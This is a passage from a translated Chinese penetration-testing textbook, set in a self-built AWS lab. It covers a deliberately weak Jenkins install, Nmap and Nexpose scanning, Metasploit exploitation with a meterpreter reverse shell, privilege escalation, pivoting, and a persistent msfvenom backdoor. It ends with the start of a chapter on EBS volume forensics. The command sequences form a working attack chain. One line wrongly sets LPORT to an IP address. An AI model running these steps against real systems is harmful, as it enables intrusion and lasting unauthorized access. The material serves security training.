您的 Jenkins 机器的防火墙规则应该是这样的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a3fba5ef-db5a-4a09-9e2d-4e03f2032ec4.jpg)

Jenkins 机器的防火墙规则

在这里，所有的流量只允许来自 Kali 机器的安全组。这只是一个安全措施，以确保没有其他人可以访问我们脆弱的 Jenkins 机器。

一旦实例启动，就是在目标机器上设置一个脆弱的 Jenkins 服务的时候了。远程桌面连接到您刚创建的机器，然后按照以下步骤操作：

1.  从[`mirrors.jenkins.io/windows/latest`](http://mirrors.jenkins.io/windows/latest)下载 Jenkins 安装包：

1.  只需双击 Jenkins 安装文件。按照屏幕上的说明进行操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3211c65f-99ca-4401-9c26-9f854a7581cc.jpg)

安装 Jenkins

1.  保持安装位置默认，然后点击下一步：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/903c6b6e-5f38-46b9-a6ff-fcf65c79b0fe.jpg)

目标文件夹

1.  最后，点击安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d2db135d-b7c0-4e50-8a51-85f43c21968b.jpg)

安装完成后，浏览器将自动打开并提示您配置 Jenkins 安装：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/badf4e62-5872-4f66-87b1-873d456aafd3.jpg)

在安装过程中，Jenkins 安装程序会创建一个初始的 32 个字符长的字母数字密码。

1.  打开位于`C:\Program Files (x86)\Jenkins\secrets\`的`initialAdminPassword`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/24b756d0-05e2-48f2-aa2a-fbb7d65dc34a.jpg)

1.  复制文件中的密码，粘贴到管理员密码字段中，然后点击“继续”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e3d93c27-e6cf-4339-8f78-3282cd4b7529.jpg)

在下一个屏幕上，设置向导将询问您是否要安装建议的插件或选择特定的插件。

1.  点击“安装建议的插件”框，安装过程将立即开始：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ccc0df8f-2da3-4d36-b5af-3385cac7ae17.jpg)

安装插件后，将提示您设置第一个`admin`用户。

1.  为了使其成为一个易受攻击的实例，我们正在使用用户名`admin`和密码也是`admin`来设置帐户。填写所有其他必需的信息，然后点击“保存并继续”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5c9aa1b1-51e7-4a05-8925-5a5add2ac906.jpg)

我们希望我们的 Jenkins 服务可以在`本地连接`接口上使用。

1.  使用命令提示符中的`ipconfig`命令查找您的 Windows Server 2008 EC2 实例的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ccb0b2b4-4f74-40c5-aa77-7688ee805bad.jpg)

1.  注意 IPv4 地址，并在配置 URL 时在 Jenkins 配置页面中填写 IP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/bd5dcb78-9dfe-41e7-b946-2ee7eaf41c18.jpg)

1.  点击“保存并完成”，然后点击“开始使用 Jenkins”。此时，您已成功在系统上安装了 Jenkins。登录后，您将被重定向到 Jenkins 仪表板。

要测试 Jenkins 登录是否可以从 Kali 机器访问，请执行以下操作：

1.  使用 PuTTY 在 Kali 机器上创建一个 SSH 隧道

1.  将本地端口`8080`转发到 Jenkins 机器的端口`8080`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3c7f5fce-e92f-4759-ae85-b655ee5d4f9a.jpg)

1.  打开浏览器，指向`http://localhost:8080`

您将看到 Jenkins 登录页面。这意味着我们的 Jenkins 机器可以从 Kali 机器访问。

# 在易受攻击的 Jenkins 机器后面设置一个目标机器

为了模拟一个位于内部网络或另一个子网中的机器，我们将设置一个 Ubuntu 机器，并使其只能从 Jenkins 服务器访问。

为了最终可视化我们的网络应该是什么样子，请参考以下图表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2837350a-c2c7-4ffa-baf5-5565c56051d9.jpg)

我们已经设置好了**AWS Jenkins 机器**；现在，我们只需要设置内部机器并将其与**AWS Kali 机器**隔离开来。

让我们看看如何做到：

1.  创建一个 Ubuntu EC2 实例

1.  在安全组设置中，编辑入站规则，并只允许来自 Jenkins 机器的安全 ID 的所有流量

确保 SSH 端口对所有人都是可访问的，以便在需要时可以登录到实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e621f0e6-d5a7-40ad-954b-79250dadd46b.jpg)

最后，我们的网络已经设置好了。网络看起来完全符合我们的预期。在下一节中，我们将安装 Nexpose 进行漏洞扫描。

# 在我们的 Kali 机器上设置 Nexpose 漏洞扫描器

在第三章 *在 Kali Linux 上利用云进行利用*中，我们看到了如何在我们的 Kali 实例上远程设置 Nessus。远程设置 Nexpose 也是一样的。为什么我们需要 Nexpose 以及 Nessus？自动化漏洞扫描器通过匹配服务版本号和操作系统签名来识别漏洞。然而，这有时可能导致误报，甚至更糟糕的是漏报。为了进行双重检查并获得更全面的漏洞评估结果，使用多个漏洞扫描器总是一个好主意：

1.  首先访问[`www.rapi`](https://www.rapid7.com/products/insightvm/download/)[d7.com/products/insightvm/download/](https://www.rapid7.com/products/insightvm/download/)[ 并注册许可证。许可证将发送到您提供的电子邮件地址。](https://www.rapid7.com/products/insightvm/download/)

1.  Nexpose 安装程序可以从[`www.rapid7.com/products/insightvm/download/thank-you/`](https://www.rapid7.com/products/insightvm/download/thank-you/)下载。

1.  我们将下载 Linux 64 位安装程序。您可以将其下载到您的计算机，然后通过 SCP 传输，就像我们在第三章中所做的那样，*在 Kali Linux 上利用云进行利用*，或者您可以直接从 Kali 实例的终端上使用`wget`进行下载，如下所示：

```
wget http://download2.rapid7.com/download/InsightVM/Rapid7Setup-Linux64.bin
```

1.  我们收到的文件是一个 POSIX shell 脚本可执行文件。我们需要给它执行权限，然后运行它。只需以`sudo`身份运行以下命令：

```
chmod +x Rapid7Setup-Linux64.bin
./Rapid7Setup-Linux64.bin
```

按照屏幕上的说明进行操作。在提示要安装哪些组件时，请确保选择带有本地扫描引擎的安全控制台[1，输入]。让其余的配置保持默认。

在安装程序提示时输入您的详细信息，并确保为您的帐户设置凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/eb7a635b-cad7-4f26-98dc-aaeb7ebd60e1.jpg)

最后，为了能够登录到安全控制台，我们需要创建一个带有用户名和密码的配置文件。在终端上提示时，输入用户名和密码。安装将完成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3304992f-e158-4010-bc79-0c1c70c1044c.jpg)

您可以选择在安装后立即初始化和启动服务。或者您可以稍后手动执行以下命令：

```
sudo systemctl start nexposeconsole.service
```

安装完成后，从本地端口`3780`设置一个 SSH 端口转发到 Kali 机器上的端口`3780`，并将浏览器指向端口`localhost:3780`。您将看到登录页面。

登录，然后在下一页上输入许可证密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c8680186-0c9a-4c2d-a01b-793806a8197e.jpg)

激活后，我们可以继续进行扫描。

# 使用 Nmap 进行扫描和侦察

在本节中，我们将查看扫描子网，并使用 Nmap 对网络进行侦察。Nmap 是网络中主机和服务的侦察、发现和识别的瑞士军刀。在我们进行扫描之前，让我们看看 Nmap 是如何工作的。

当发现网络中的活动主机时，ping 扫描非常方便。这种类型的扫描涉及向网络中的每个主机发送**ICMP ECHO 请求**，然后根据响应识别哪些主机是活动的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/06e01d2a-c079-4159-8aa1-dcdc9a045a21.jpg)

从图中，我们可以看到一些主机响应了**ICMP ECHO 回复**，而有些没有。根据哪些主机回复，我们可以确定哪些主机是活动的。

在 ping 扫描中，我们向 Nmap 提供一个网络范围，通常是一个网络地址及其 CIDR 形式的子网。我们的 AWS 机器托管在 AWS 的默认子网中。子网被指定为`172.31.0.0/20`。这意味着网络地址是`172.31.0.0`，`20`是 CIDR 值。换句话说，网络的子网掩码是`255.255.255.240`，可以容纳总共`4094`个 IP 地址。

让我们继续在我们的网络中进行 ping 扫描。为了这样做，我们将使用`nmap`的`-sn`标志。`-sn`标志指示`nmap`执行 ping 扫描，`172.31.0.0/20`输入告诉`nmap`这是一个网络范围。SSH 进入 Kali 机器并发出以下命令：

```
sudo nmap -sn 172.31.0.0/20

```

前面命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6dec2127-d7e7-404f-bbd8-d7998dec0f32.jpg)

从输出中，我们可以看到`nmap`已经识别出五个活动的主机。不包括`172.31.0.1`和`172.31.0.2`地址，我们可以看到网络中有三个活动的主机：我们的 Kali 机器，易受攻击的 Windows 机器和 Ubuntu 机器。

接下来，我们将学习如何扫描特定主机上的开放端口并识别服务。

# 使用 Nmap 识别和指纹开放端口和服务

继续上一节的内容，我们现在将扫描一个主机的开放端口，然后尝试识别运行在目标上的服务。在这个练习中，我们将使用 Nmap 的**SYN**扫描`-sS`标志。这是默认和最常用的扫描技术。为什么？因为这种扫描速度快，可以在不受防火墙干扰的情况下进行。扫描也是隐蔽的，因为它不完成 TCP 握手。扫描可以在开放、关闭和被过滤的端口之间产生明显和准确的结果。那么这种扫描是如何工作的呢？让我们来看一下。

**SYN**扫描使用半开放的 TCP 连接来确定端口是开放还是关闭。**SYN**扫描过程可以通过以下图表可视化：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/203ec61b-2fb9-4bc8-922d-8e67268f5c17.jpg)

每次端口扫描都是从 Nmap 向指定端口发送**SYN**数据包开始的。如果端口是开放的，目标会以**SYN-ACK**数据包作为响应。然后 Nmap 会将该端口标记为开放，然后立即通过发送**RST**数据包关闭连接。

在关闭的端口的情况下，当 Nmap 发送**SYN**数据包时，目标会用**RST**数据包做出响应；然后 Nmap 会将该端口标记为关闭，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d8b5719c-08a5-4578-bfdc-6a895649fbdc.jpg)

当 Nmap 向一个端口发送**SYN**数据包并且没有收到任何响应时，它会进行重试。如果仍然没有响应，那么该端口将被标记为被过滤；也就是说，它受到了防火墙的保护。另一种情况是，如果 Nmap 收到 ICMP 不可达的错误，而不是没有响应，那么该端口将被标记为被过滤：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/57efa254-12af-467c-875b-77774c41ca71.jpg)

1.  让我们从对 Jenkins 机器进行简单的`nmap`扫描开始。发出以下命令：

```
sudo nmap 172.31.10.227
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0535829c-28c5-47d4-afbc-7785ab835244.jpg)

正如我们所看到的，我们得到了`nmap`发现的开放端口的列表。然而，我们只扫描了默认的端口列表。这留下了一些未经检查的端口。识别所有开放的端口是至关重要的，所以让我们看看还有哪些端口是开放的。

1.  发出以下命令：

```
sudo nmap -T4 -p- 172.31.10.227
```

`-T4`用于多线程以加快速度。`-p-`标志告诉`nmap`扫描所有`65535`个端口。您可以选择添加`-v`标志使输出更详细，并打印有关目标的更多信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/83e34671-2a97-4a72-a178-d2aa2487de1a.jpg)

正如我们所看到的，我们在之前的扫描中错过了一个开放的端口，端口`5985/tcp`。这说明扫描所有`65535`个端口以寻找开放的端口是很重要的。

我们的下一步是识别这些开放端口上运行的服务。那么 Nmap 是如何识别这些端口上运行的服务的呢？Nmap 执行完整的 TCP 握手，然后等待端口上运行的服务返回其服务横幅。Nmap 有自己的探测数据库来查询服务并匹配响应以解析运行的服务是什么。然后 Nmap 将尝试根据收到的信息来识别协议、服务和底层操作系统。

以下图解释了握手和数据交换的过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9a7c4358-9eac-41f3-9edd-c6f9ff82697d.jpg)

1.  下一步是识别这些端口上运行的所有服务。发出以下命令：

```
sudo nmap -v -p 135,139,445,3389,5985,8080,49154 -sV 172.31.10.227
```

在这个命令中，我们指定了要扫描的端口`135`、`139`、`445`、`3389`、`5985`、`8080`和`49154`，因为它们是唯一开放的端口。我们可以使用`-p`参数指定要扫描的特定端口或端口范围：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/89d0b381-7d8b-45e6-a9be-db7ea3289b23.jpg)

Nmap 从扫描结果中打印出大量信息。我们可以看到所有开放的端口都已经被扫描以运行服务。在这些中，我们对 2 个端口感兴趣。注意端口`445/tcp` - Nmap 已经确定了服务为 SMB，并确定目标机器是运行 Windows Server 2008 R2 或 2012 的服务器。这是非常重要的，以确定我们的目标正在运行什么操作系统，因此相应地规划我们的下一步。

操作系统也可以通过使用`-O`标志来确定。Nmap 可以通过从服务接收到的响应，使用 CPE 指纹，或通过分析网络数据包来识别目标操作系统。

# 使用 Nexpose 执行自动化漏洞评估

在前面的*在我们的 Kali 机器上设置 Nexpose 漏洞扫描器*部分中，我们学习了如何在我们的 Kali 攻击者机器上设置 Nexpose 扫描器。在本节中，我们将看看如何使用 Nexpose 对目标机器执行自动化的漏洞扫描。

但首先，Nexpose 如何识别目标中的漏洞？

这个想法与 Nmap 在服务发现期间所做的非常相似。但是，Nexpose 的工作规模要比仅识别特定端口上运行的服务大得多。整个过程可以总结如下：

1.  **主机发现**：Nexpose 发送 ICMP 数据包以确定主机是否存活。根据响应，目标被标记为存活。

1.  **端口扫描**：确认主机存活后，Nexpose 发送大量 TCP 数据包以识别正在侦听 TCP 的开放端口。同时，它发送 UDP 流量以识别仅在 UDP 上侦听的端口。Nexpose 可以发送流量到所有端口，或者发送到扫描模板中预定义的端口列表。扫描响应和网络数据包被分析以识别目标上运行的操作系统类型。

1.  **服务发现**：Nexpose 然后与 TCP 和 UDP 上的开放端口进行交互，以识别正在运行的服务。

1.  **操作系统指纹识别**：分析来自端口和服务扫描的数据，以识别目标系统的操作系统。这并不总是非常准确，因此 Nexpose 使用评分系统来表示扫描结果的确定程度。

1.  **漏洞检查**：最后，已识别的服务将被扫描以查找未确认和已确认的漏洞。为了检查任何未确认的漏洞，Nexpose 从服务横幅中识别出补丁和版本。然后，这些信息将与可能影响该特定软件版本的任何已知漏洞进行匹配。例如，如果 Nexpose 发现目标的端口 80 上运行着 Apache HTTP 2.4.1，Apache 将获取这些信息并交叉参考其漏洞数据库，以确定该版本是否存在任何已知漏洞。基于此，它将列出分配给该特定漏洞的**常见漏洞和暴露**（**CVEs**）。然而，这些是未经确认的，因此需要手动测试以确认漏洞是否存在。另一方面，已确认的漏洞可能类似于某些软件使用默认密码。Nexpose 将检查软件是否仍在使用默认密码运行，尝试登录，并仅在成功登录时将其报告为漏洞。

1.  **暴力破解攻击**：Nexpose 的扫描模板默认设置为测试诸如 SSH、Telnet 和 FTP 之类的服务，以查找默认用户名和密码组合，例如`'admin':'admin'`或者`'cisco':'cisco'`。任何这样的发现都将被添加到报告中。

1.  **策略检查**：作为额外的奖励，Nexpose 检查目标机器的配置，以验证它们是否符合 PCI DSS、HIPAA 等基线。

1.  **报告**：最后，所有发现都被放入报告并显示在屏幕上。

总结整个过程，以下是该过程的瀑布模型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/89a0bc79-a909-45f2-8139-1f8123d64951.jpg)

Nexpose 可以选择配置为执行 Web 扫描，发现 Web 服务，检查 SQLi 和 XSS 等漏洞，并执行 Web 蜘蛛。

让我们开始扫描目标服务器：

1.  在本地端口`3780`转发到 Kali 机器上的端口`3780`，创建一个 SSH 隧道

1.  如果 Nexpose 服务没有运行，你可以通过发出以下命令来启动它：

```
sudo systemctl start nexposeconsole.service
```

1.  将你的浏览器指向`https://localhost:3780`

初始化完成后，我们将看到 Nexpose 的主屏幕：

1.  在这里，我们需要点击“创建新站点”来在之前设置的 Jenkins 目标上开始一个新的扫描。给站点取任何你想要的名字：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5354f206-9cb1-4153-b9e0-7b23e71e92b4.jpg)

1.  现在添加你的目标 IP 地址。目标 IP 地址可以是一系列 IP、用逗号分隔的单个 IP 或整个子网及其 CIDR 值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/343efe13-5957-4a78-9c49-41b63e0475b4.jpg)

1.  将扫描类型设置为详尽。有许多可用的扫描类型。我们使用详尽扫描，以便 Nexpose 检查所有端口，找到任何打开的端口，无论是 TCP 还是 UDP。每种单独的扫描类型都可以用于特定的用例。例如，**发现扫描**可以用于仅发现网络中的主机，而**HIPAA 合规性**将仅检查目标的配置和策略，以查看它们是否符合 HIPAA 基线。开始扫描并等待其完成：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/92ce890b-87b4-4ebe-8552-6cef0aa09c61.jpg)

与第三章中的 Nessus 一样，*使用 Kali Linux 在云上进行利用*，Nexpose 提供了大量信息，包括我们目标上运行的服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/71c10889-bd77-4378-9eca-cb6e40ac865e.jpg)

我们还看到它识别出了一些漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/68ce9363-f512-4ed3-9975-2268fd0500db.png)

然而，它未能检测到我们的有漏洞的 Jenkins 服务。通常，需要对 Jenkins 服务进行暴力破解，以找到一组有效的凭据。然而，我们假设我们已经有了登录凭据。在下一节中，我们将看到如何利用这样一个有漏洞的服务并拥有目标服务器。

# 使用 Metasploit 进行自动化利用

在这个演示中，我们将使用 Metasploit 来利用 Jenkins 服务器，并在其上获取一个 meterpreter shell。Jenkins 有自己的脚本控制台，用户可以在其中输入和运行任意代码。如果用户的凭据被盗，这是危险的，因为任何人都可以使用脚本控制台运行任意代码。我们将使用的 Metasploit 模块利用了这一点，并尝试运行代码，以创建到远程机器的连接。

让我们看看如何进行利用：

1.  通过发出以下命令，通过 SSH 登录到 Kali 机器并加载 Metasploit 框架：

```
msfconsole
```

1.  接下来，我们将搜索 Metasploit 是否有与 Jenkins 相关的任何利用：

```
search jenkins
```

前面命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6fa513aa-0421-4b58-9913-1d1737280445.jpg)

我们看到了一些与 Jenkins 相关的模块。

1.  在这种情况下，我们将使用`jenkins_script_console`利用。发出以下命令：

```
use exploit/multi/http/jenkins_script_console
```

1.  让我们设置利用并配置我们的目标服务器。逐一发出以下命令：

```
set RHOSTS <<IP Address>>
set RPORT 8080
set USERNAME admin
set PASSWORD admin
set TARGETURI /
set target 0
```

`目标 0`表示这是一台 Windows 机器。

1.  要查看所有可用的有效载荷列表，请发出以下命令：

```
show payloads
```

列出所有有效载荷供我们审阅：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/24bf09e8-22df-4bfd-8210-d987c81d7698.jpg)

1.  我们将使用反向 TCP 有效载荷进行此利用。由于我们的 Windows 机器是 64 位的，我们将选择 64 位有效载荷进行传递。然后，将你的`LHOST`设置为你的 Kali IP 地址：

```
set payload windows/x64/meterpreter/reverse_tcp
set LPORT <<Kali IP Address>>
```

一旦所有这些都完成了，你可以发出`show options`命令来检查是否填写了所有必需的数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2f1d1528-907e-4aef-bf6d-1e863d609eb4.jpg)

1.  现在，简单地运行利用。你将进入一个 meterpreter shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/68a6af0b-7820-4675-84b3-925576ae7ab9.jpg)

我们已成功获得了对目标机器的 shell 访问。在接下来的部分，我们将看到如何进行特权升级和枢纽，以及使我们的后门持久化。

# 使用 Meterpreter 进行特权升级、枢纽和持久性

现在是我们练习的第二阶段。一旦我们有了 meterpreter shell，我们将尝试进行特权升级，并在目标服务器上获得尽可能高的特权。

但首先，让我们更多地了解一下我们的目标服务器。运行以下命令：

```
sysinfo
```

上述命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b081a36a-ff9e-4f4e-9e7e-3ecf6e12f41e.jpg)

我们得到了一堆信息，比如这台机器正在运行的 Windows 版本、域等等。

现在是时候进行特权升级了，输入以下命令：

```
getsystem
```

如果成功，你通常会得到这样的响应：

```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
```

这意味着我们的特权升级成功了。为了验证，我们可以输入以下命令：

```
getuid
```

如果我们是最高特权用户，我们应该得到一个`Server username: NT AUTHORITY\SYSTEM`的响应。

现在我们完全控制了服务器，让我们开始在内部网络上寻找机器。为此，我们将枢纽我们的 meterpreter 会话，并在我们的 Kali 机器上为内部网络创建一个桥接：

1.  首先将你的 meterpreter shell 后台化：

```
background
```

1.  添加`target`和`session`的路由 ID：

```
route add <<target ip>> <<subnet mask>> <<meterpreter session>>

```

1.  接下来，为了验证我们已经枢纽，我们将尝试使用 Metasploit 对隐藏的 Ubuntu 机器进行端口扫描：

```
use auxiliary/scanner/portscan/tcp
set RHOSTS <<Ubuntu IP address>>
run
```

上述命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f53dd1f8-1773-4cc4-9dfd-50122717f12e.jpg)

从扫描结果中，我们可以看到有许多端口是开放的。这意味着我们成功地枢纽了我们的受损机器。我们可以得出这样的结论，因为只有端口`22`（SSH）是公开的；从任何其他机器进行的扫描只会显示端口`22`是开放的。一旦枢纽成功，我们可以通过我们的受损 Windows 机器在内部网络中执行大量攻击。

现在是我们练习的最后一部分——我们如何确保我们对受损机器有持久访问？我们可以使用后渗透模块来实现。首先，我们需要创建一个恶意的`.exe`文件，它将连接回我们的 Kali 机器。为此，我们将使用 Metasploit 套件中的另一个工具`msfvenom`：

1.  如果你在 meterpreter 会话中，将其后台化，并输入以下命令：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali ip> LPORT=4444 -f exe -o /tmp/evil.exe
```

使用`msfvenom`，我们创建了一个需要传输到受害者机器的`exe`文件。

1.  重新进入 meterpreter 会话，输入以下命令：

```
run post/windows/manage/persistence_exe REXEPATH=/tmp/evil.exe REXENAME=default.exe STARTUP=USER LocalExePath=C:\\tmp
```

上述命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3ef86d02-f685-4f04-a6c6-74888a38a4d1.jpg)

让我们检查一下我们的持久性是否有效。为了验证这一点，在 meterpreter 会话中，重新启动目标服务器并退出 meterpreter 会话。从 meterpreter 会话中输入以下命令：

```
reboot
```

通过运行`exit`命令退出 meterpreter 会话。

现在，我们设置 Metasploit 监听传入连接。依次输入以下命令：

```
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <<Kali IP Address>>
set LPORT 4444
run
```

我们从目标服务器获得了一个新的传入连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ed93de70-06b1-4c42-a553-fb803690bd74.jpg)

因此，我们成功地为我们的受损服务器创建了一个后门，并创建了持久访问。这结束了我们的练习。这种持久访问现在可以用于横向移动，并允许我们攻击网络中的其他机器。

# 摘要

本章介绍了如何设置一个易受攻击的 EC2 环境，模拟一个受限网络，然后对其进行渗透测试。我们学习了如何以易受攻击的方式配置 Jenkins 服务器。随后，我们学习了如何设置 Nexpose 漏洞扫描器，然后对我们易受攻击的 Jenkins 服务器进行了漏洞扫描。此外，我们学习了如何使用 Metasploit 对 Jenkins 进行自动化利用，并使用 meterpreter 有效载荷来在受限网络内进行主机转移和横向移动。

这就是第五章的结束。在下一章中，我们将学习关于 EBS 卷、磁盘加密和卷快照。此外，我们将学习如何进行取证分析，并从 EBS 卷中恢复丢失的数据。

# 进一步阅读

+   [`www.packtpub.com/networking-and-servers/mastering-metasploit`](https://www.packtpub.com/networking-and-servers/mastering-metasploit)

+   [`nexpose.help.rapid7.com/docs/security-console-quick-start-guide`](https://nexpose.help.rapid7.com/docs/security-console-quick-start-guide)

+   [`jenkins.io/doc/tutorials/`](https://jenkins.io/doc/tutorials/)


# 第六章：弹性块存储和快照 - 检索已删除的数据

本章向您介绍了通过 AWS 提供的不同存储选项，扩展了第三章中介绍的信息，即*在 Kali Linux 上利用云*。在这里，我们专注于创建独立的**弹性块存储**（**EBS**）卷，从多个 EC2 实例中附加和分离卷，并挂载分离的卷以从之前的 EC2 实例和 EBS 快照中检索数据。本章还涵盖了从 EBS 卷中取回已删除数据的取证过程。这突出了在针对 AWS 基础架构进行后期利用过程中的一个非常重要的部分，因为检查 EBS 卷和快照是获取敏感数据（如密码）的一种非常简单的方式。

在本章中，我们将涵盖以下内容：

+   在 EC2 实例中创建、附加和分离新的 EBS 卷

+   加密 EBS 卷

+   在 EC2 实例中挂载 EBS 卷以检索数据

+   从 EBS 卷中提取已删除的数据以查找敏感信息

# 技术要求

本章将使用以下工具：

+   侦探工具包（TSK）

# EBS 卷类型和加密

EBS 存储可以广泛分为两种不同的存储类型——**固态硬盘**（**SSD**）和**硬盘驱动器**（**HDD**）：

+   基于 SSD 的卷针对频繁读/写操作和小 I/O 大小的事务工作负载进行了优化，其中主要的性能属性是**每秒 I/O 操作**（**IOPS**）。

+   基于 HDD 的卷针对大型流式工作负载进行了优化，其中吞吐量（以 MiB/s 为单位）是比 IOPS 更好的性能指标。

EBS 有四种主要的存储类型，每种都适用于特定的用例：

+   **通用型 SSD（GP2）卷**：这些是成本效益高的存储解决方案，适用于各种工作负载的通用用途。这些卷可以在较长时间内维持 3,000 IOPS，最少 100 IOPS，最多 10,000 IOPS。GP2 卷提供非常低的延迟，并且可以按每 GB 3 IOPS 进行扩展。GP2 卷的空间可以分配在 1GB 到 16TB 之间。

+   **预配置 IOPS SSD（IO1）卷**：这些比 GP2 卷快得多，提供的性能也更高。IO1 卷可以维持 100 到 32,000 IOPS，比 GP2 多三倍以上。这种存储类型专为 I/O 密集型操作（如数据库）而设计。AWS 还允许您在创建 IO1 卷时指定 IOPS 速率，AWS 可以持续提供。IO1 卷的预配置范围为最少 4GB 到最大 16TB。

+   **吞吐量优化的 HDD（ST1）**：ST1 是一种基于磁存储盘而不是 SSD 的低成本存储解决方案。这些不能用作可引导卷；相反，它们最适合存储频繁访问的数据，如日志处理和数据仓库。这些卷只能在 1GB 到 1TB 的范围内。

+   **冷 HDD（SC1）**：SC1 卷，虽然与 ST1 卷相似，但不适用于保存频繁访问的数据。这些也是低成本的磁存储卷，不能用作可引导的卷。与 ST1 类似，这些卷只能在 1GB 到 1TB 的范围内。

# 从 EC2 实例中创建、附加和分离新的 EBS 卷

在本教程中，我们将学习如何在 Ubuntu EC2 实例上创建、附加和挂载 EBS 卷。然后我们将创建和删除一些文件，分离它，然后尝试提取已删除的数据：

1.  转到 EC2 | 卷并创建一个新卷。在本练习中，我们创建一个额外的 8GB 大小的卷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b94a1375-1d8d-45d1-bd64-454d1da16e61.png)

如果要对卷进行加密（这是可选的），请执行以下步骤：

+   1.  选择“加密此卷”的复选框

1.  选择要在主密钥下使用的密钥管理服务（KMS）客户主密钥（CMK）

1.  选择创建卷

1.  选择创建的卷，右键单击，然后选择附加卷选项。

1.  从实例文本框中选择 Ubuntu 实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f17b6e21-3616-4c28-9956-347641e73acc.png)

1.  通过 SSH 进入 Ubuntu 实例，并使用以下命令列出可用磁盘：

```
lsblk
```

这将列出您附加到实例的磁盘。在这种情况下，我们可以看到一个名为`/dev/xvdf`的设备。

1.  使用以下命令检查卷是否有任何数据：

```
sudo file -s /dev/xvdf
```

如果前面的命令输出显示`/dev/xvdf: data`，这意味着您的卷是空的。

1.  现在我们将需要将卷格式化为`ext4`文件系统。为此，请发出以下命令：

```
sudo mkfs -t ext4 /dev/xvdf
```

1.  接下来，我们将创建一个目录来挂载我们的新的`ext4`卷。在这里，我们使用名称`newvolume`：

```
sudo mkdir /newvolume
```

1.  最后，我们使用以下命令将卷挂载到`newvolume`目录：

```
sudo mount /dev/xvdf /newvolume/
```

1.  您可以进入`newvolume`目录并检查磁盘空间以确认卷挂载：

```
cd /newvolume
df -h .
```

1.  一旦卷被附加，我们就可以向其写入数据。我们将创建一个`data.txt`文件并向其写入一些数据。然后将删除此文件，并稍后尝试使用 TSK 恢复文件：

```
sudo touch data.txt
sudo chmod 666 data.txt
echo "Hello World" > data.txt
```

1.  现在让我们删除文件，稍后我们将恢复它：

```
sudo rm -rf data.txt
```

1.  是时候分离卷了。我们将首先卸载卷；退出文件夹并发出此命令：

```
